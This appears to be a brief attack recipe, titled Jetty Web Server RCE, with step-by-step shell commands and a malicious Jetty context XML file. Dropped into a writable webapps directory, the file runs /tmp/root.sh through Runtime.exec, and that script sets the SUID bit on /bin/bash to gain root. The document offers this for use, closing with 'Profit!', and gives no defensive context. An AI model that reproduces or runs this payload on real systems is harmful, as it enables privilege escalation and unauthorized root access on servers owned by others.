# Jetty Web Server RCE

## Requirements:

Writable $JETTY_BASE/webapps/ directory

## Steps:

### 1) Go to the webapps directory

    cd /opt/jetty/jetty-base/webapps/

### 2) Create a malicious script to be executed

    echo "chmod +s /bin/bash" > /tmp/root.sh
    chmod +x /tmp/root.sh

### 3) Create the malicious XML file

    nano shell.xml

Contents

    <?xml version="1.0"?>  
    <!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">  
    <Configure class="org.eclipse.jetty.server.handler.ContextHandler">  
        <Call class="java.lang.Runtime" name="getRuntime">  
            <Call name="exec">  
                <Arg>  
                    <Array type="String">  
                        <Item>/tmp/root.sh</Item>  
                    </Array>  
                </Arg>  
            </Call>  
        </Call>  
    </Configure>

### 4) Profit!
